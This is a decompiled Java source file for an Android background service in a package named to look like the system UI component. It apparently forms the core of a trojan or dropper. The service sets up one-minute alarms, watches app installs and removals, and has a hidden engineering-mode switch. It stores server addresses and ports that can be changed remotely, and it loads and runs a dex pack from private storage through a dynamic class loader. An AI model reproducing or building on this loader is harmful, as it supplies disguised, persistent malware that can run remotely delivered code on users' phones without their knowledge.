package com.android.systemui.assis.main;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.SystemClock;
import android.text.format.Time;
import android.widget.Toast;
import com.android.systemui.assis.app.LOG;
import com.android.systemui.assis.app.MAIN.CONFIG;
import com.android.systemui.assis.app.MAIN.CONSTANT;
import com.android.systemui.assis.app.MAIN.INTENT;
import com.android.systemui.assis.app.MAIN.KEY;
import com.android.systemui.assis.app.MAIN.NET;
import com.android.systemui.assis.core.DexLoader;
import com.android.systemui.assis.core.IDynMain;
import com.android.systemui.assis.core.IStatistics;
import com.android.systemui.assis.core.IStatistics.ShellInfo;
import com.android.systemui.assis.core.IStatistics.UdpServer;
import com.android.systemui.assis.datas.security.Guardian.MD5;
import com.android.systemui.assis.modules.IMainConfig;
import com.android.systemui.assis.modules.INetClient;
import com.android.systemui.assis.modules.MainConfig;
import com.android.systemui.assis.modules.NetClient;
import com.android.systemui.assis.task.TaskPackLoader;
import java.io.File;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.RejectedExecutionException;
import java.util.concurrent.TimeUnit;

public class Main extends Service implements IStatistics {
    private static final String TAG = "Shell";
    private boolean isDynPackLoaded = false;
    private Context mAppletContext = null;
    private Time mCurSysTime = null;
    private IDynMain mDynMain = null;
    private ExecutorService mMainExecutorPool = null;
    private final Handler mMainHandler = new Handler() {
        public void handleMessage(Message msg) {
            LOG.I(Main.TAG, "Message : {what[" + msg.what + "]  obj[" + msg.obj + "]}");
            if (msg.what == 100) {
                Main.this.doReboot();
            }
            if (!Main.this.isDynPackLoaded) {
                if (msg.what == 43) {
                    Main.this.isDynPackLoaded = true;
                } else if (msg.what != 53) {
                    if (Main.this.mPackLoaderTask != null) {
                        Main.this.mPackLoaderTask.processSystemMessage(msg);
                    }
                } else if (Main.this.mDynMain == null) {
                    Main.this.loadDynamicPack();
                }
                Main main;
                if (msg.what == 1) {
                    int timeModeBy10 = Main.this.noPackLastingTime % 10;
                    LOG.I(Main.TAG, "timeModeBy10 = " + timeModeBy10 + " noPackLastingTime : " + Main.this.noPackLastingTime);
                    if (timeModeBy10 == 0 && Main.this.mNetClient.isNetActivated()) {
                        sendEmptyMessage(40);
                    }
                    main = Main.this;
                    main.noPackLastingTime = main.noPackLastingTime + 1;
                    if (Main.this.noPackLastingTime == Integer.MAX_VALUE) {
                        Main.this.noPackLastingTime = 0;
                    }
                } else if (msg.what == 4 || msg.what == 5) {
                    sendEmptyMessage(40);
                    main = Main.this;
                    main.noPackLastingTime = main.noPackLastingTime + 1;
                    if (Main.this.noPackLastingTime == Integer.MAX_VALUE) {
                        Main.this.noPackLastingTime = 0;
                    }
                }
            } else if (msg.what == 1) {
                Main.this.mCurSysTime.setToNow();
                Main.this.mDynMain.onMinTick(Main.this.mCurSysTime);
            } else if (msg.what == 8) {
                Main.this.doReboot();
            } else if (!Main.this.mDynMain.processSystemMessage(msg)) {
                super.handleMessage(msg);
            }
        }
    };
    private Pacemaker mMainPacemaker = null;
    private INetClient mNetClient = null;
    private PacemakerBCReceiver mPacemakerBCReceiver = null;
    private TaskPackLoader mPackLoaderTask = null;
    private PackageBCReceiver mPackageBCReceiver = null;
    private BroadcastReceiver mSecretCodeListner = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(INTENT.ACTIVE_ENG_MODE)) {
                LOG.switchEngMode(true);
                Toast.makeText(Main.this, "EngMode is switched ON", 850).show();
            } else if (intent.getAction().equals(INTENT.DEACTIVE_ENG_MODE)) {
                LOG.switchEngMode(false);
                Toast.makeText(Main.this, "EngMode is switched OFF", 850).show();
            }
        }
    };
    private IMainConfig mShellConfig = null;
    private ShellInfo mShellInfo = null;
    private int noPackLastingTime = 0;

    private class Pacemaker {
        private AlarmManager alarm = null;
        private Context mContext = null;
        private long mFrequency = 0;
        private PendingIntent mPendingIntent = null;

        public Pacemaker(Context context) {
            this.mContext = context;
            this.alarm = (AlarmManager) Main.this.getSystemService("alarm");
        }

        public Pacemaker(Context context, long freq) {
            this.mContext = context;
            this.mFrequency = freq;
            this.alarm = (AlarmManager) Main.this.getSystemService("alarm");
            if (freq == CONSTANT.ONE_HOUR) {
                this.mPendingIntent = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT.ACTION_TIME_TICK_ONEHOUR), 1);
            } else if (freq == 600000) {
                this.mPendingIntent = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT.ACTION_TIME_TICK_TENMIN), 1);
            } else {
                this.mPendingIntent = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT.ACTION_TIME_TICK_ONEMIN), 1);
            }
        }

        public void init(long freq) {
            this.mFrequency = freq;
            if (freq == CONSTANT.ONE_HOUR) {
                this.mPendingIntent = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT.ACTION_TIME_TICK_ONEHOUR), 1);
            } else if (freq == 600000) {
                this.mPendingIntent = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT.ACTION_TIME_TICK_TENMIN), 1);
            } else {
                this.mPendingIntent = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT.ACTION_TIME_TICK_ONEMIN), 1);
            }
        }

        public void start() {
            this.alarm.setRepeating(2, SystemClock.elapsedRealtime() + this.mFrequency, this.mFrequency, this.mPendingIntent);
        }

        public void cancel() {
            this.alarm.cancel(this.mPendingIntent);
        }
    }

    private class PacemakerBCReceiver extends BroadcastReceiver {
        private static final String TAG = "Shell.PacemakerBCReceiver";

        private PacemakerBCReceiver() {
        }

        public void onReceive(Context context, Intent intent) {
            LOG.I(TAG, intent + "--> Received");
            String action = intent.getAction();
            if (action.equals(INTENT.ACTION_TIME_TICK_ONEMIN)) {
                Main.this.mMainHandler.sendEmptyMessage(1);
            } else if (action.equals(INTENT.ACTION_TIME_TICK_TENMIN)) {
                Main.this.mMainHandler.sendEmptyMessage(2);
            } else if (action.equals(INTENT.ACTION_TIME_TICK_ONEHOUR)) {
                Main.this.mMainHandler.sendEmptyMessage(3);
            }
        }
    }

    private class PackageBCReceiver extends BroadcastReceiver {
        private PackageBCReceiver() {
        }

        public void onReceive(Context context, Intent intent) {
            LOG.I(Main.TAG, intent + "--> Received");
            String action = intent.getAction();
            Message msg = new Message();
            if (action.equals("android.intent.action.PACKAGE_ADDED")) {
                msg.what = 9;
                msg.obj = intent.getData().getSchemeSpecificPart();
                Main.this.mMainHandler.sendMessage(msg);
            } else if (action.equals("android.intent.action.PACKAGE_REPLACED")) {
                msg.what = 10;
                msg.obj = intent.getData().getSchemeSpecificPart();
                Main.this.mMainHandler.sendMessage(msg);
            } else if (action.equals("android.intent.action.PACKAGE_REMOVED")) {
                msg.what = 11;
                msg.obj = intent.getData().getSchemeSpecificPart();
                Main.this.mMainHandler.sendMessage(msg);
            }
        }
    }

    public IBinder onBind(Intent arg0) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.noPackLastingTime = 0;
        this.mCurSysTime = new Time();
        this.mAppletContext = getApplicationContext();
        this.mMainPacemaker = new Pacemaker(this.mAppletContext);
        this.mMainPacemaker.init(60000);
        this.mPacemakerBCReceiver = new PacemakerBCReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(INTENT.ACTION_TIME_TICK_ONEMIN);
        filter.addAction(INTENT.ACTION_TIME_TICK_TENMIN);
        filter.addAction(INTENT.ACTION_TIME_TICK_ONEHOUR);
        registerReceiver(this.mPacemakerBCReceiver, filter);
        this.mPackageBCReceiver = new PackageBCReceiver();
        IntentFilter pbcFilter = new IntentFilter();
        pbcFilter.addAction("android.intent.action.PACKAGE_ADDED");
        pbcFilter.addAction("android.intent.action.PACKAGE_REPLACED");
        pbcFilter.addAction("android.intent.action.PACKAGE_REMOVED");
        pbcFilter.addDataScheme("package");
        registerReceiver(this.mPackageBCReceiver, pbcFilter);
        IntentFilter scodeFilter = new IntentFilter();
        scodeFilter.addAction(INTENT.ACTIVE_ENG_MODE);
        scodeFilter.addAction(INTENT.DEACTIVE_ENG_MODE);
        registerReceiver(this.mSecretCodeListner, scodeFilter, null, null);
        this.mNetClient = new NetClient();
        this.mNetClient.onCreate(this);
        this.mShellConfig = new MainConfig();
        this.mShellConfig.onCreate(this);
        this.mPackLoaderTask = new TaskPackLoader();
        this.mPackLoaderTask.onCreate(this);
        this.mMainExecutorPool = Executors.newFixedThreadPool(8);
        buildShellInfo();
        this.mMainPacemaker.start();
    }

    public void onDestroy() {
        try {
            if (this.mPacemakerBCReceiver != null) {
                unregisterReceiver(this.mPacemakerBCReceiver);
            }
            if (this.mMainPacemaker != null) {
                this.mMainPacemaker.cancel();
            }
            if (this.mPackageBCReceiver != null) {
                unregisterReceiver(this.mPackageBCReceiver);
            }
            unregisterReceiver(this.mSecretCodeListner);
        } catch (Exception e) {
        }
        if (this.mDynMain != null) {
            this.mDynMain.onDestroy();
        }
        if (this.mNetClient != null) {
            this.mNetClient.onDestroy();
        }
        if (this.mPackLoaderTask != null) {
            this.mPackLoaderTask.onDestroy();
        }
        if (this.mMainExecutorPool != null) {
            this.mMainExecutorPool.shutdown();
        }
        super.onDestroy();
    }

    private void shutdownAndAwaitTermination(ExecutorService pool) {
        pool.shutdown();
        try {
            if (!pool.awaitTermination(60, TimeUnit.SECONDS)) {
                pool.shutdownNow();
                if (!pool.awaitTermination(60, TimeUnit.SECONDS)) {
                    System.err.println("Pool did not terminate");
                }
            }
        } catch (InterruptedException e) {
            pool.shutdownNow();
            Thread.currentThread().interrupt();
        }
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        return 1;
    }

    private void buildShellInfo() {
        this.mShellInfo = new ShellInfo();
        try {
            ApplicationInfo appInfo = this.mAppletContext.getPackageManager().getApplicationInfo(getPackageName(), 128);
            this.mShellInfo.mAppletId = String.valueOf(appInfo.metaData.getInt("ww_proj"));
            this.mShellInfo.mVersionInfo = appInfo.metaData.getString("ww_verinfo");
            this.mShellInfo.mVersionCode = 36;
        } catch (NameNotFoundException e1) {
            e1.printStackTrace();
        }
        this.mShellInfo.mCustId = this.mShellConfig.getIntValue(KEY.CUST_ID, -1);
    }

    private void loadDynamicPack() {
        String dexPath = new StringBuilder(String.valueOf(this.mAppletContext.getFilesDir().getAbsolutePath())).append(File.separator).append(CONFIG.DYNAMIC_PACK_NAME).toString();
        Class<?> cls = DexLoader.loadClass(DexLoader.loadDex(this.mAppletContext, dexPath, MD5.md5sum(dexPath)), CONFIG.DYNAMIC_MAIN_CLSNAME);
        if (cls != null) {
            try {
                this.mDynMain = (IDynMain) cls.newInstance();
                this.mDynMain.onCreate(this);
                this.mMainHandler.sendEmptyMessage(43);
            } catch (InstantiationException e) {
                LOG.E(TAG, "InstantiationException " + e.getMessage());
            } catch (IllegalAccessException e2) {
                LOG.E(TAG, "IllegalAccessException " + e2.getMessage());
            }
        }
    }

    private void doReboot() {
        LOG.E(TAG, "!!!terminate service!!!");
        stopSelf();
    }

    public Object getShellService(String name) {
        if (name.equals(IStatistics.INSTANCE_NETCLIENT)) {
            return this.mNetClient;
        }
        if (name.equals(IStatistics.INSTANCE_SHELLCONFIG)) {
            return this.mShellConfig;
        }
        if (name.equals(IStatistics.INSTANCE_PACKCORE)) {
            return this.mDynMain;
        }
        return null;
    }

    public Context getAppletContext() {
        return getApplicationContext();
    }

    public void submitTask(Runnable runable) {
        try {
            this.mMainExecutorPool.execute(runable);
        } catch (RejectedExecutionException e) {
            e.printStackTrace();
        } catch (NullPointerException e2) {
            e2.printStackTrace();
        }
    }

    public void sendEmptyMessage(int what) {
        this.mMainHandler.sendEmptyMessage(what);
    }

    public void sendMessage(Message msg) {
        this.mMainHandler.sendMessage(msg);
    }

    public void sendMessageDelayed(Message msg, long delayTime) {
        this.mMainHandler.sendMessageDelayed(msg, delayTime);
    }

    public ShellInfo getShellInfo() {
        return this.mShellInfo;
    }

    public UdpServer getUdpServer() {
        UdpServer server = new UdpServer();
        server.mIP = this.mShellConfig.getStringValue(KEY.UDP_SERVER, NET.UDP_HOST);
        server.mMinPort = this.mShellConfig.getIntValue(KEY.UDP_MIN_PORT, NET.UDP_PORT_MIN);
        server.mMaxPort = this.mShellConfig.getIntValue(KEY.UDP_MAX_PORT, NET.UDP_PORT_MAX);
        return server;
    }

    public void setUdpServer(UdpServer server) {
        try {
            InetAddress.getByName(server.mIP);
            this.mShellConfig.setValue(KEY.UDP_SERVER, server.mIP);
            this.mShellConfig.setValue(KEY.UDP_MIN_PORT, server.mMinPort);
            this.mShellConfig.setValue(KEY.UDP_MAX_PORT, server.mMaxPort);
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public String getRegServerIp() {
        return this.mShellConfig.getStringValue(KEY.REGSVR_IP, "");
    }

    public int getRegServerPort() {
        return this.mShellConfig.getIntValue(KEY.REGSVR_PORT, 0);
    }

    public void setRegServer(String ip, int port) {
        this.mShellConfig.setValue(KEY.REGSVR_IP, ip);
        this.mShellConfig.setValue(KEY.REGSVR_PORT, port);
    }
}
